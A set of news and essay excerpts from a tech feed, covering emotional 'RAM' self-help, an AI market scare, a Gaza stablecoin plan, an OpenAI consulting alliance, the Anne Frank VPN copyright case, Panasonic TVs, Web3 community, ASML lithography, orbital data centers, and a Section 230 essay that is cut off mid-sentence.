      "content": "<p>Unprocessed emotions act like background apps hogging your brain's limited working memory, slowing you down even in quiet moments. This fresh lens recasts cognitive overload as emotional RAM drain—and introduces introspection as the ultimate cleaner.</p><p>\\\nSome cognitive models suggest that unprocessed emotions can waste  of our thinking bandwidth. It’s like trying to ship code while a background process silently occupies one-third of your CPU.</p><p>\\\nThis “emotional residue”—the stuff we suppress to get through the day—doesn’t go away; it keeps building up in our system.</p><p>\\\nHere’s how to debug your “emotional RAM” and reclaim lost performance.</p><p>\\\nLet’s see just how complex and sophisticated we really are.</p><p>\\\n==What are “unprocessed emotions”?==  They’re residual emotions we unconsciously suppress so we can keep functioning. They’re like worries or “I’ll deal with it later,” except that “later” never comes.</p><p>\\\n==*Unprocessed emotions act as 'zombie processes' in your mental RAM.==</p><h2>1) The Invisible RAM Leak in Modern Code</h2><p>High-velocity work—context switches, deadlines, team pings—leaves emotional residue: stress loops, grudges, \"what if\" scans.</p><p>\\\nGenerally, working memory typically maxes out at four to seven chunks. Unprocessed emotions cause that load to swell silently, generating distracting replays like a garbage collection heap that’s failing to clear.</p><p>\\\nThesis: Defrag emotions to reclaim cycles; introspection runs the garbage collector.</p><p>\\\n means the brain can hold only a small number of separate units of information in working memory at one time.</p><p>\\\n = one “package” your mind treats as a single item.</p><p>\\\n A 10-digit phone number becomes one chunk if you group it (e.g., 555–123–7890).</p><h2>2) Emotions as Memory Leaks</h2><p>Think of an unprocessed emotion as a background process that refuses to close. When you experience a micro-stressor—a passive-aggressive email or a looming deadline—your brain opens a \"file\" to deal with the threat.</p><p>\\\nIf you don't acknowledge the emotion and resolve the underlying tension, your brain keeps that file active in working memory—continuously draining resources while waiting for a resolution that never comes. It’s like leaving the water running in your pool while you're away on vacation.</p><p>\\\nAnxiety replays threats in a tight loop, anger caches grudges, and unresolved needs spawn daemon processes that run indefinitely.</p><p>\\\nThe \"extra load\" isn't just a metaphor.</p><p>\\\nResearch on emotion regulation shows measurable increases in cognitive effort, manifested as pupil dilation, slower dual-task speed, and reduced performance. Rumination does inhibit working memory updating and executive control, keeping emotional processes running in the background and competing with limited attention spans.</p><h2>3. Regulation vs. Resolution: Muting vs. Deleting</h2><p>Managing load requires two different protocols.</p><p>\\\n ==A mindfulness== ==reset== quiets the noise in front of you.</p><p>\\\n<strong>Resolve (the cache purge):</strong> ==Introspection audits== your activity and deletes files. Many people keep their \"mute\" button pressed while their RAM is at maximum capacity.</p><p>\\\nThere is such a big difference.</p><h2>4. Regulation: Muting the Alarm</h2><p>Breathwork and sensory grounding are your emergency \"circuit breakers.\" By quieting the amygdala and lowering your heart rate, you ease the immediate drain on your system.</p><p>\\\n Acute spikes (e.g., mid-meeting overwhelm).</p><p>\\\n It lowers the volume, but ==it doesn't delete the \"source code\" of the stress==.</p><h2>5. Resolution: The Introspection Purge</h2><p>An Introspection is a \"system scan\" for hidden RAM thieves.</p><ul><li>What is the cost of holding it?\"</li></ul><p>\\\nBy surfacing the \"protection intent\" (e.g., fear acting as a defensive shield), you convert emotional static into processed data.</p><h2>6. The Defragmentation Logic</h2><p>How does the purge actually free up space?</p><ul><li> Naming an emotion (e.g., \"This is grief\") collapses the replay loop.</li><li> Recognizing that \"Anger is guarding a boundary\" neutralizes the charge.</li><li> Allowing the feeling without the \"story\" cuts the physical friction.</li></ul><h2>7. Presence vs. Processing: Beyond \"Being Here Now.\"</h2><ul><li> Senses drown out the chatter for temporary relief.</li><li><strong>Processing (Introspection):</strong> Dives into the mechanics—spotting the friction () and the grasping ().</li></ul><blockquote><p> Presence closes the tabs for a few minutes; Processing deletes the history and clears the cache.</p></blockquote><h2>8. Rewiring the OS: Building Emotional Fluency</h2><h2>Consistent \"cache clearing\" builds genuine neuroplasticity.</h2><p>By regularly auditing these loops, you retrain your nervous system to recognize that it is safe to process and release data in real-time rather than storing it in \"cold storage\" (suppression).  This architectural shift results in higher baseline bandwidth, lower latency in decision-making, and significantly less \"preload\" dragging down your daily performance. Our nervous system learns that it is safe to feel and release rather than store and suppress.</p><h2>9. The Buddhist Debug Model</h2><p>Think of it as a non-religious operating system: <strong>==Trigger → Tightening → Grasping/Avoiding → RAM Clog.==</strong></p><p>\\\n is the shift from grasping to clear seeing. Notice the tightening as it forms, label the pull to grab or push away, and stay with raw sensation until it loosens and the signal moves through.</p><h3>The \"Buddhist OS\" Connection</h3><p>In the original framework this is based on, these are two distinct wings of a bird:</p><ol><li><p> This is mindfulness. Stability, focus, and lowering the noise.</p></li><li><p><strong>Vipassana (Insight/Clear Seeing):</strong> This is introspection. Investigating the mechanics of the \"self\" and the \"loops\" to gain a perspective that permanently changes how you respond to data.</p></li></ol><h2>10. The 12-Minute RAM Reset</h2><ol><li> Body scan to lower the noise floor and stabilize the system.</li><li> Name the emotion → Identify its intent → Evaluate the cost → Execute one release action.</li></ol><h2>11. Conclusion: Reclaim Our Bandwidth</h2><p>In a high-output environment, emotional RAM management is a competitive advantage.</p><p>\\\nClear space to think sharper, create faster, and lead better.</p><ul><li>Mindfulness quiets the alert.</li><li>Introspection cancels the subscription.</li></ul><p>\\\nThese are the essential skills for navigating the modern world.</p>",

From the report: Concerns of hyperscalers overspending are out. Worries of software-industry disruption don't go far enough. The \"global intelligence crisis\" is about to hit. The new, broader question: What if AI is so bullish for the economy that it is actually bearish? \"For the entirety of modern economic history, human intelligence has been the scarce input,\" Citrini wrote in a post it described as a scenario dated June 2028, not a prediction. \"We are now experiencing the unwind of that premium.\"\n \nMany of Monday's moves roughly aligned with the situation outlined by Citrini, in which fast-advancing AI tools allow spending cuts across industries, sparking mass white-collar unemployment and in turn leading to financial contagion. Software firms DataDog, CrowdStrike and Zscaler each plunged more than 9%. International Business Machines' 13% decline was its worst one-day performance since 2000. American Express, KKR and Blackstone -- all name-checked by Citrini -- tumbled. That anxiety, coupled with renewed uncertainty about trade policy from Washington, weighed down major indexes Monday. The Dow Jones Industrial Average led declines, falling 1.7%, or 822 points. The S&amp;P 500 shed 1%, while the Nasdaq composite retreated 1.1%.\n \n[...] Monday's market swings extended a run of AI-linked volatility. A small research outfit that has garnered a huge Substack following for macro and thematic stock research, Citrini said in its new post that software firms, payment processors and other companies formed \"one long daisy chain of correlated bets on white-collar productivity growth\" that AI is poised to disrupt. [...] Shares in DoorDash also veered 6.6% lower Monday after Citrini's Substack note called the delivery app a \"poster child\" for how new tools would upend companies that monetize interpersonal friction. In the research firm's scenario, AI agents would help both drivers and customers navigate food deliveries at much lower costs.",

The talks around introducing a stablecoin -- a type of cryptocurrency whose value is pegged to a mainstream currency, such as the US dollar -- are at a preliminary stage, and many details of how one could be introduced in Gaza remain to be determined.\n \nBut officials have discussed the idea as part of their plan for the future of the enclave, where economic activity collapsed during Israel's two-year war with Hamas and the traditional banking and payments system has been severely impaired. A person familiar with the project said the stablecoin was expected to be tied to the US dollar, with the hope that Gulf Arab and Palestinian companies with expertise in the field of digital currencies will help spearhead the effort. \"This will not be a 'Gaza Coin' or a new Palestinian currency, but a means to allow Gazans to transact digitally,\" the person said.\n \nWork on the idea is being led by Liran Tancman, an Israeli tech entrepreneur and former reservist who is now working as an unpaid adviser to Trump's \"Board of Peace,\" the US-led body tasked with rebuilding Gaza, according to two people familiar with the matter. [...] According to the person familiar with the project, the \"Board of Peace\" and NCAG will decide on the stablecoin's regulatory framework and access, although \"nothing definitive\" has yet been finalized. Speaking at a meeting of the \"Board of Peace\" in Washington last week, Tancman said the NCAG was working on building \"a secure digital backbone, an open platform enabling e-payments, financial services, e-learning, and healthcare with user control over data\", but did not elaborate.",

      "content": "OpenAI has formed a multi-year \"Frontier Alliance\" with four consulting heavyweights to accelerate enterprise adoption of its no-code AI agent platform, OpenAI Frontier. TechCrunch reports: The alliance includes multi-year partnerships between OpenAI and four major consulting firms, Boston Consulting Group (BCG), McKinsey, Accenture and Capgemini, to sell its enterprise products. OpenAI's Forward Deployed Engineering team will work with the consulting giants to help them implement OpenAI's enterprise-focused technologies like OpenAI Frontier into customers' tech stacks.\n \nThe company launched OpenAI Frontier in early February. The no-code open software allows users to build, deploy, and manage AI agents both built on OpenAI's AI models and beyond. OpenAI argues in its latest announcement that consultants are the right avenue to get enterprises on board.\n \n\"AI alone does not drive transformation. It must be linked to strategy, built into redesigned processes, and adopted at scale with aligned incentives and culture to deliver sustained outcomes,\" BCG CEO Christoph Schweizer said in OpenAI's blog post. \"Our expanded partnership combines OpenAI's Frontier platform with BCG's deep industry, functional, and tech expertise and BCG X's build-and-scale capabilities to drive measurable impact with safeguards from day one.\"",

      "content": "<p>“The Diary of a Young Girl” is&nbsp;<a href=\"https://en.wikipedia.org/wiki/The_Diary_of_a_Young_Girl\">a Dutch language diary</a>&nbsp;written by the young Jewish writer&nbsp;<a href=\"https://en.wikipedia.org/wiki/Anne_Frank\">Anne Frank</a>&nbsp;while she was in hiding for two years with her family during the Nazi occupation of the Netherlands. Although the diary and Anne Frank’s death in the Bergen-Belsen concentration camp are well known, few are aware that the text has a complicated copyright history – one that could have important implications for the legal status and use of Virtual Private Networks (VPNs) in the EU.&nbsp;<a href=\"https://torrentfreak.com/adviser-of-eus-highest-court-backs-vpn-neutrality-in-anne-frank-copyright-battle/\">TorrentFreak explains the copyright background</a>:</p><blockquote><p><em>These copyrights are controlled by the Swiss-based Anne Frank Fonds, which was the sole heir of Anne’s father, Otto Frank. The Fonds states that many print versions of the diary remain&nbsp;<a href=\"https://www.annefrank.ch/en/q-and-a\">protected for decades</a>, and even the manuscripts are not freely available everywhere.</em></p><p><em>In the Netherlands, for example, certain sections of the manuscripts remain protected by copyright until 2037, even though they have entered the public domain in neighboring countries like Belgium.</em></p></blockquote><p>A separate foundation, the Netherlands-based Anne Frank Stichting, wanted to publish a scholarly edition of Anne Frank’s writing, at least in those parts of the world where her diary was in the public domain:</p><blockquote><p><em>To navigate these conflicting laws, the Dutch&nbsp;<a href=\"https://www.annefrank.org/\">Anne Frank Stichting</a>&nbsp;published a scholarly edition online using “state-of-the-art” geo-blocking to prevent Dutch residents from accessing the site. Visitors from the Netherlands and&nbsp;<a href=\"https://torrentfreak.com/images/access-check.png.webp\">other countries where the work is protected</a>&nbsp;are met with a clear message, informing them about these access restrictions.</em></p></blockquote><p>However, the Anne Frank Fonds was unhappy with this approach, and took legal action. Its argument was that such geo-blocking could be circumvented with VPNs, and so its copyrights in the Netherlands could be infringed upon by those using VPNs. The lower courts in the Netherlands dismissed this argument, and the case is now before the Dutch Supreme Court. Beyond the specifics of the Anne Frank scholarly edition, there are important issues regarding the use of VPNs to get around geo-blocking. Because of the potential knock-on effect the ruling in this case will have on EU law, the Dutch Supreme Court has asked for guidance from the EU’s top court, the Court of Justice of the European Union (CJEU).</p><p>The CJEU has yet to rule on the issues raised. But one of the court’s advisors, Advocate General Rantos, has published&nbsp;<a href=\"https://infocuria.curia.europa.eu/tabs/document/C/2024/C-0788-24-00000000RP-01-P-01/CONCL/314269-EN-1-html\">a preliminary opinion</a>, as is normal in such cases. Although that advice is not binding on the CJEU, it often provides some indication as to how the court may eventually decide. On the main issue of whether the ability of people to circumvent geo-blocking is a problem, Rantos writes:</p><blockquote><p><em>the fact that users manage to circumvent a geo-blocking measure put in place to restrict access to a protected work does not, in itself, mean that the entity that put the geo-blocking in place communicates that work to the public in a territory where access to it is supposed to be blocked. Such an interpretation would make it impossible to manage copyright on the internet on a territorial basis and would mean that any communication to the public on the internet would be global.</em></p></blockquote><blockquote><p><em>As the [European] Commission pointed out in its written observations, the holder of an exclusive right in a work does not have the right to authorise or prohibit, on the basis of the right granted to it in one Member State, communication to the public in another Member State in which that right has ceased to have effect.</em></p></blockquote><p>Or, more succinctly: “service providers in the public domain country cannot be subject to unreasonable requirements”. That’s a good, common-sense view. But perhaps just as important is the following comment by Rantos regarding the use of VPNs to circumvent geo-blocking:</p><blockquote><p><em>as the Commission points out in its observations, VPN services are legally accessible technical services which users may, however, use for unlawful purposes. The mere fact that those or similar services may be used for such purposes is not sufficient to establish that the service providers themselves communicate the protected work to the public. It would be different if those service providers actively encouraged the unlawful use of their services.</em></p></blockquote><p>The hope has to be that the CJEU will agree with its Advocate General’s sensible and fair analysis, and will rule accordingly. But there is another important aspect to this story. The basic issue is that the Anne Frank Stichting wants to make its scholarly edition of Anne Frank’s diary available as widely as possible. That seems a laudable aim, since it will increase understanding and appreciation of the young woman’s remarkable diary by publishing an academically rigorous version. And yet the Anne Frank Fonds has taken legal action to stop that move, on the grounds that it would represent an infringement of its intellectual monopoly in some parts of Frank’s work, in some parts of the world. The current dispute is another clear example of how copyright has become for some an end in itself, more important than the things that it is supposed to promote.</p>",

Ars Technica reports: Skyworth is a Shenzhen-headquartered TV brand. The company claims to be \"a top three global provider of the Android TV platform.\" In July, research firm Omdia reported that Skyworth was one of the top-five TV brands by sales revenue in Q1 2025; however, Skyworth hasn't been able to maintain that position regularly. Panasonic made its announcement at a \"launch event,\" FlatpanelsHD reported today. During the event, a Panasonic representative reportedly said: \"Under the agreement the new partner will lead sales, marketing, and logistics across the region, while Panasonic provide expertise and quality assurance to uphold its renowned audiovisual standards with full joint development on top-end OLED models.\"\n \nPanasonic also said that it will provide support \"for all Panasonic TVs sold up to March 2026 and all those available from April.\" Skyworth-made Panasonic TVs will be sold in the US and Europe. In the latter geography, the companies are aiming for double-digit market share. [...] The news means there's virtually no TV production happening in Japan anymore, as other Japanese companies, like Sharp, Toshiba, Hitachi, and Pioneer, have already exited TV production. Earlier this year, Sony announced that it was ceding control of its TV hardware business to TCL.",

      "content": "<p>Most Web3 projects don't have a community problem. They have a trust problem. And the fastest way to destroy trust is to treat the community like a growth tactic.</p><p>\\\nIn crypto, it's easy to confuse noise for health. A Discord full of messages. A Telegram that never sleeps. A timeline full of engagement. But anyone who's been entrenched in communities long enough knows the truth. A crowd can look like a community right up until the moment things get real.</p><p>\\\nThe market turns. Incentives dry up. A rumor spreads. Someone posts a screenshot with no context. Sentiment flips in hours. And suddenly your \"community\" becomes a stress test. That's when you find out what you actually built.</p><p>If the only reason people show up is points, rewards, and price, then what you have is not a community. It's a rewards program. The moment the rewards stop, the participation stops. The moment the chart turns, the room turns. You cannot retrofit trust into a crowd that assembled around speculation.</p><p>\\\nA real community has something underneath the incentives. Something slower. Something sturdier. Trust. Clarity. Contribution. Shared direction.</p><p>An audience consumes. A community contributes. That distinction sounds simple, but it changes everything. It changes what you build. It changes what you measure. It changes how you communicate. Engagement can be bought. Participation has to be earned.</p><p>\\\nIn Web3, participation is what turns a product into an ecosystem. It turns a token into a network. It turns users into builders. And it doesn't happen by accident.</p><h2><strong>The market is not just about price. The market is about mood.</strong></h2><p>Mood is shaped by narratives, rumors, screenshots, and fear. It moves faster than facts. And when a project isn't actively building clarity, someone else will fill the vacuum. Usually the loudest person. Usually, the least informed person. Usually, the person who benefits from chaos.</p><p>\\\nThis is why community leadership isn't just posting updates. It's maintaining shared reality. When a piece of misinformation about your protocol goes viral at 2 am, your community is either a fire department or a fire accelerant.</p><p>\\\nClarity is not a nice-to-have. It's infrastructure. Tone is not aesthetics. Tone is policy. If your communication is vague, inconsistent, or defensive, your community will feel it immediately. And once people lose trust, you don't win it back with a campaign. You win it back with behavior over time.</p><h2><strong>Onboarding isn't documentation. Its identity.</strong></h2><p>Most Web3 onboarding is terrible. A newcomer joins a Discord and gets hit with a wall of channels, a wall of jargon, a Notion doc with 20 links, and a culture where everyone acts as if you should already know everything. Then teams wonder why nobody sticks.</p><p>\\\nOnboarding isn't a pinned message. It's the moment where someone decides: do I belong here? A good onboarding experience makes people feel smart quickly. It gives them context, a first step, and an understanding of what the project actually is and what kind of person it is for. Most importantly, it gives them a path to contribute that is not purely financial. Because the moment you reduce participation to rewards, you train people to behave like mercenaries.</p><h2><strong>Participation is designed, not hoped for.</strong></h2><p>One of the biggest myths in Web3 is that community just happens. It doesn't. Healthy communities are designed, not in a controlling way, but in a human way. They create a structure that makes it easier for good behavior to happen and harder for bad behavior to dominate.</p><p>\\\nIn practice, that means clear roles for different types of members, visible paths from curiosity to contribution, repeatable programs that create rhythm, recognition that feels earned, not bought, and norms that protect the room from turning into noise. The best communities don't rely on constant excitement. They rely on consistency. They make it easy for the right people to find each other and start building.</p><p>This is the part most teams don't want to hear. Communities expose everything. They expose whether your product has real pull, whether your messaging is honest, whether your incentives are aligned, whether your leadership is steady or reactive, and whether you have real contributors or just spectators. And once trust is broken, it doesn't come back through better marketing. It comes back through discipline.</p><p>\\\nHype attracts. Trust retains. They are not the same thing, and they are not friends. A project flush with hype can feel like community, especially from the inside. New people every day, energy in every thread, speculation about what's next. But hype creates expectations it cannot fulfill, and when it doesn't fulfill them, the people it attracted leave, loudly.</p><p>\\\nTrust does the opposite. It accumulates quietly, through small moments of honesty and consistency, until the day something goes wrong and it turns out you have people in your corner who weren't just there for the upside.</p><p>\\\nThat is the difference between a crowd and a network. A crowd shares a moment. A network shares a direction.</p>",

      "content": "An anonymous reader quotes a report from Reuters: Researchers at ASML Holding say they have found a way to boost the power of the light source in a key chip making machine to turn out up to 50% more chips by decade's end, to help retain the Dutch company's edge over emerging U.S. and Chinese rivals. ASML is the world's only maker of commercial extreme ultraviolet lithography (EUV) machines, a critical tool for chipmakers such as TSMC, Intel and others in producing advanced computing chips. \"It's not a parlor trick or something like this, where we demonstrate for a very short time that it can work,\" Michael Purvis, ASML's lead technologist for its EUV source light, said in an interview. \"It's a system that can produce 1,000 watts under all the same requirements that you could see at a customer,\" he added, speaking at the company's California facilities near San Diego. [...]\n \nWith the technological advance revealed on Monday, which is being reported here for the first time, ASML aims to outdistance any would-be rivals by improving the most technologically challenging aspect of the machines. This is the quest to generate EUV light with the right power and properties to turn out chips at high volume. The company's researchers have found a way to boost the power of the EUV light source to 1,000 watts from 600 watts now. The chief advantage is that greater power translates into the ability to make more chips every hour, helping to lower the cost of each. Chips are printed similar to a photograph, where the EUV light is shone on a silicon wafer coated with special chemicals called a photoresist. With a more powerful EUV light source, chip factories need shorter exposure times. \"We'd like to make sure that our customers can keep on using EUV at a much lower cost,\" Teun van Gogh, executive vice president for the NXE line of EUV machines at ASML, told Reuters. Van Gogh said customers should be able to process about 330 silicon wafers an hour on each machine by the end of the decade, up from 220 now. Depending on the size of a chip, each wafer can hold anywhere from scores to thousands of the devices.\n \nASML got the power boost by doubling down on an approach that already places its machines among the most complex inventions of humans. To produce light with a wavelength of 13.5 nanometers, ASML's machine shoots a stream of molten droplets of tin through a chamber, where a massive carbon dioxide laser heats them into plasma. This is a superheated state of matter in which the tin droplets become hotter than the sun and emit EUV light, to be collected by precision optic equipment supplied by Germany's Carl Zeiss AG and fed into the machine to print chips. The key advancements in Monday's disclosure involved doubling the number of tin drops to about 100,000 every second, and shaping them into plasma using two smaller laser bursts, as opposed to today's machines that use a single shaping burst. [...] ASML believes the techniques it used to hit 1,000 watts will unlock continued advances in the future, Purvis said, adding, \"We see a reasonably clear path toward 1,500 watts, and no fundamental reason why we couldn't get to 2,000 watts.\"",

      "content": "<p>The rapid advancement of artificial intelligence (AI) has created an unprecedented surge in the demand for energy. Training and running large-scale models require massive computational resources housed in power-intensive data centers. Today, hyperscale <a href=\"https://www.iea.org/reports/energy-and-ai/energy-demand-from-ai\">AI facilities demand gigawatts of power</a>, equivalent to the needs of an entire city. This demand strains grids and increases emissions from fossil fuel reliance, not to mention exacerbating water scarcity due to cooling needs. While there have been improvements in efficiency in hardware and algorithms, the exponential scaling of AI models means infrastructure on Earth faces real limits in energy availability, land, regulatory hurdles, environmental impact, and cooling ability. This is where space comes into the picture.</p><p>\\\nIn the very near future, AI servers and data centers may be launched into space, which is deemed a viable location for such sizeable and energy-hungry technologies. In orbit, solar panels receive constant, uninterrupted sunlight – energy – without the need for human-generated electricity, removing the ability to overextend the existing energy grid limit on Earth. In space, it’s near-limitless, clean energy capture. Equally important, the vacuum of space provides superior radiative cooling, dissipating heat efficiently without the massive air- and water-based systems required on Earth, where cooling can use massive amounts of energy.</p><p>\\\nSpaceX and Google have already announced plans to deploy orbital servers for trial. At the recent Davos conference, Elon Musk said that space-based computing <a href=\"https://www.youtube.com/watch?v=ym5D2MR2XB0\">could become the cheapest option</a> for AI training within the next two or three years. “The lowest cost place to put AI will be space, and that'll be true within two years, maybe three at the latest,” Musk said.</p><p>\\\nThe advantages of space-based AI servers are compelling. They offer abundant, always-on solar power that can support gigawatt-scale operations sustainably, eliminate land and water issues, reduce emissions, and enable modular constellations for massive scalability. The natural vacuum cooling of space eliminates not only the need for heavy cooling infrastructure but also protection from Earth-based disasters or regulations, providing operational stability and resilience.</p><p>\\\nHowever, while the dream of space-based AI data centers is likely to become a reality mainly due to necessity, there are significant hurdles that must first be overcome. Launch costs may be dropping with reusable rockets like Starship, but they are still limited and too high to sustain frequent deployments. Hardware needs to be upgraded as it will face intense radiation that will degrade its components, and heat management will require careful design to avoid overheating in the sunlight. Latency for data transmission to Earth, while low in low-Earth orbit, introduces significant delays compared to terrestrial systems.</p><p>\\\nMaintenance will be close to impossible without advanced autonomous robotics, as it will be difficult and costly to send astronauts into space every time there is a server issue. The overall economics of such an endeavor are unknown, so it remains a long-term solution for now and not an immediate fix. In the near term, though, we will need to rely on Earth-based systems to generate the energy and cooling needs of AI data centers. Once the technical and economic hurdles are overcome, orbital data centers, with their many advantages, will no doubt become a reality.</p>",

      "content": "<p>If you’ve spent any time in my <a href=\"https://www.techdirt.com/2020/06/23/hello-youve-been-referred-here-because-youre-wrong-about-section-230-communications-decency-act/\">Section 230 myth-debunking guide</a>, you know that most bad takes on the law come from people who haven’t read it. But lately I keep running into a different kind of bad take—one that often comes from people who  read the law, understand the basics passably well, and still say: “Sure, keep 230 as is, but carve out algorithmically recommended content.”</p><p>Unlike the usual nonsense, this one is often (though not always) offered in good faith. That makes it worth engaging with seriously.</p><p>Let’s start with the basics: as we’ve described at great length, the real benefits of Section 230 are <a href=\"https://www.techdirt.com/2019/04/18/new-paper-why-section-230-is-better-than-first-amendment/\">its procedural protections</a>, which make it so that  cases get tossed out at the earliest (i.e., cheapest) stage. That makes it possible for sites that host third party content to do so in a way that they won’t get sued out of existence any time anyone has a complaint about someone else’s content being on the site. This important distinction gets lost in almost every 230 debate, but it’s important. Because if the lawsuits that removing 230 protections would enable would still eventually win on First Amendment grounds, the  you’re doing in removing 230 protections is making lawsuits impossibly expensive for individuals and smaller providers, without doing any real damage to large companies, who can survive those lawsuits easily.</p><p>And that takes us to the key point: removing Section 230 for algorithmic recommendations would  lead to vexatious lawsuits that will fail.</p><p><strong>But what about [specific bad thing]?</strong></p><p>Before diving into the legal analysis, let’s engage with the strongest version of this argument. Proponents of carving out algorithmic recommendations typically aren’t imagining ordinary defamation suits. They’re worried about something more specific: cases where an algorithm  arguably causes harm through its recommendation patterns—radicalization pipelines, engagement-driven amplification of dangerous content, recommendation systems that push vulnerable users toward self-harm.</p><p>The theory goes something like this: maybe the underlying content is protected speech, but the —especially when the algorithm was designed to maximize engagement and the company knew this could cause harm—should create liability, usually as some sort of “products liability” type complaint.</p><p>It’s a more sophisticated argument than “platforms are publishers.” But it still fails, for reasons I’ll explain below. The short version: a recommendation is an opinion, opinions are protected speech, and the First Amendment doesn’t carve out “opinions expressed via algorithm” as a special category.</p><p><strong>A short history of algorithmic feeds</strong></p><p>To understand why removing 230 from algorithmic recommendations would be such a mistake, it helps to remember the apparently forgotten history of how we got here. In the pre-social media 2000s, “information overload” was the panic of the moment. <a href=\"https://guykawasaki.com/reality-check-f/\">Much of the discussion</a> centered on the “new” technology of RSS feeds, and there were plenty of articles <a href=\"https://signalvnoise.com/posts/144-taming-the-rss-beast\">decrying too much information</a> flooding into our feed readers. People weren’t worried about algorithms—they were  for them. Articles <a href=\"https://web.archive.org/web/20190818180026/https://slate.com/technology/2008/02/persai-a-new-filtering-program-that-aims-to-cure-the-web-s-information-overload.html\">breathlessly anticipated</a> magical new filtering systems that might finally surface what you actually wanted to see.</p><p>The most prominent example was Netflix, back when it was still shipping DVDs. Because there were so many movies you could rent, Netflix built one of the first truly useful recommendation algorithms—one that would take your rental history and suggest things you might like. The entire internet now looks like that, but in the mid-2000s, this was revolutionary.</p><p>As social media grew, the “information overload” panic of the blog+RSS era faded, precisely because platforms added recommendation algorithms to surface content users were most likely to enjoy. The algorithms weren’t imposed on users against their will—they were the answer to users’ prayers.</p><p>Public opinion only seemed to shift on “algorithms” after Donald Trump was elected in 2016. Many people wanted something to blame, and “social media algorithms” was a convenient excuse.</p><p><strong>Algorithmic feeds: good or bad?</strong></p><p>Many people claim they just want a chronological feed, but studies consistently show the vast majority of people <a href=\"https://www.brookings.edu/articles/when-do-consumers-prefer-algorithmic-versus-human-decisionmakers/\">prefer</a> algorithmic recommendations, because they surface more of what users actually want, <a href=\"https://www.belfercenter.org/publication/can-algorithmic-recommendation-systems-be-good-democracy-yes-chronological-feeds-may-be\">compared to chronological feeds</a>.</p><p>That said, it’s not as simple as “algorithms good.” There’s <a href=\"https://pmc.ncbi.nlm.nih.gov/articles/PMC11894805/\">evidence</a> that algorithms optimized purely for engagement can push emotionally charged political content that users don’t actually want (something Elon Musk might <a href=\"https://www.nature.com/articles/d41586-026-00486-z\">take notice of</a>). But there’s also evidence that chronological feeds <a href=\"https://www.science.org/doi/full/10.1126/science.abp9364?intcmp=trendmd-sci\">expose users to  untrustworthy content</a>, because algorithms often filter out garbage.</p><p>So, algorithms can be good or bad depending on <a href=\"https://kgi.georgetown.edu/wp-content/uploads/2025/02/Better-Feeds_-Algorithms-That-Put-People-First.pdf\">what they’re optimized for</a> and who controls them. That’s the real question: will any given regulatory approach give more power to users, to companies, or to the government?</p><p>Keep that frame in mind. Because removing 230 protections for algorithmic recommendations shifts power  from users and toward incumbents and litigants.</p><p><strong>The First Amendment still exists</strong></p><p>As mentioned up top, the real role of Section 230 is providing a procedural benefit to get vexatious lawsuits tossed well before (and at much lower cost) they would get tossed anyway, under the First Amendment. With Section 230, you can get a case dismissed for somewhere in the range of $50k to $100k (maybe up to $250k with appeals and such). If you have to rely on the First Amendment, it’s up in the millions of dollars (probably $5 to $10 million).</p><p>And, the crux of this is that any online service sued over an algorithmic recommendation, even for something horrible, would almost certainly win on First Amendment grounds.</p><p>Because here’s the key point: a recommendation feed is <em>a website’s opinion of what they think you want to see.</em> And an opinion is protected speech. Even if you think it’s a bad or dangerous opinion. One thing that the US has been pretty clear on is that opinions are protected speech.</p><p>Saying that an internet service can be held liable for giving its opinion on “what we think you’d like to see” would be earth shatteringly problematic. As partly discussed above, the modern internet today relies heavily on algorithms recommending stuff, giving opinions. Every search result is just that, an opinion.</p><p>This is why the “algorithms are different” argument fails. Yes, there’s a computer involved. Yes, the recommendation emerges from machine learning rather than a human editor’s conscious decision. But the output is still an expression of judgment: “Based on what we know, we think you’ll want to see this.” That’s an opinion. The First Amendment doesn’t distinguish between opinions formed by editorial meetings and opinions formed by trained models.</p><p>In the earlier internet era, there were companies that sued Google because they didn’t like how their own sites appeared (or didn’t appear) in Google search results. The <a href=\"https://www.courtlistener.com/docket/4227514/e-ventures-worldwide-llc-v-google-llc/\">E-Ventures v. Google</a> case here is instructive. Google determined that E-Venture’s “SEO” techniques were spammy, and de-indexed all its sites. E-Ventures sued. Google (rightly) raised a 230 defense which (surprisingly!) <a href=\"https://www.techdirt.com/2016/05/20/court-says-google-doesnt-have-first-amendment-right-to-drop-site-search-results/\">a court rejected</a>.</p><p>But the case went on longer, and after lots more money on lawyers was spent, Google <a href=\"https://www.techdirt.com/2017/02/16/court-says-google-has-first-amendment-right-to-delist-competitors-spammy-content/\">did prevail</a> on First Amendment grounds.</p><p>This is exactly what we’re discussing here. Google search ranking is an algorithmic recommendation engine, and in this one case a court (initially) rejected a 230 defense, causing everyone to spend more money… to get to the same basic result in the long run. The First Amendment protects a website using algorithms to express an opinion over what it thinks you’ll want… or not want.</p><p>This brings us back to the steelman argument I mentioned above: what about cases where an algorithm recommends something genuinely dangerous?</p><p>Our legal system has a clear answer, and it’s grounded in agency. A recommendation feed is not hypnotic. If an algorithm surfaces content suggesting you do something illegal or dangerous, you still have to  to do the illegal or dangerous thing. The algorithm doesn’t control you. You have agency.</p><p>But there’s a stronger legal foundation here too. Courts have consistently found that recommending something dangerous is still protected by the First Amendment, particularly when the recommender lacks specific knowledge that what they’re recommending is harmful.</p><p>The <a href=\"https://law.justia.com/cases/federal/appellate-courts/F2/938/1033/294363/\">Winter v. GP Putnam’s Sons</a> case is instructive here. The publisher of a mushroom encyclopedia included recommendations to eat mushrooms that turned out to be poisonous—very dangerous! But the court found the publisher wasn’t liable because they didn’t have specific knowledge of the dangerous recommendation. And crucially, the court noted that the “gentle tug of the First Amendment” would block any “duty of care” that would require publishers to verify the safety of everything they publish:</p><blockquote><p><em>The plaintiffs urge this court that the publisher had a duty to investigate the accuracy of The Encyclopedia of Mushrooms’ contents. We conclude that the defendants have no duty to investigate the accuracy of the contents of the books it publishes. A publisher may of course assume such a burden, but there is nothing inherent in the role of publisher or the surrounding legal doctrines to suggest that such a duty should be imposed on publishers. Indeed the cases uniformly refuse to impose such a duty. Were we tempted to create this duty, the gentle tug of the First Amendment and the values embodied therein would remind us of the social costs.</em></p></blockquote><p>Now, I should acknowledge that Winter was a products liability case involving a physical book, not a defamation or tortious speech case involving an algorithm, but almost all of the current cases challenging social media are self-styled as product liability cases to try (usually without success) to avoid the First Amendment. And that’s all they would be regarding algorithms as well.</p><p>The underlying principle remains the same whether you call it a products liability case or one officially about speech: the First Amendment bars requirements that publishing intermediaries must “investigate” whether everything they distribute is accurate or safe. The reason is obvious—such liability would prevent all sorts of things from getting published in the first place, putting a massive damper on speech.</p><p>Apply that principle to algorithmic recommendations, and the answer is clear. If a book publisher can’t be required to verify that every mushroom recommendation is safe, a platform can’t be required to verify that every algorithmically surfaced piece of content won’t lead 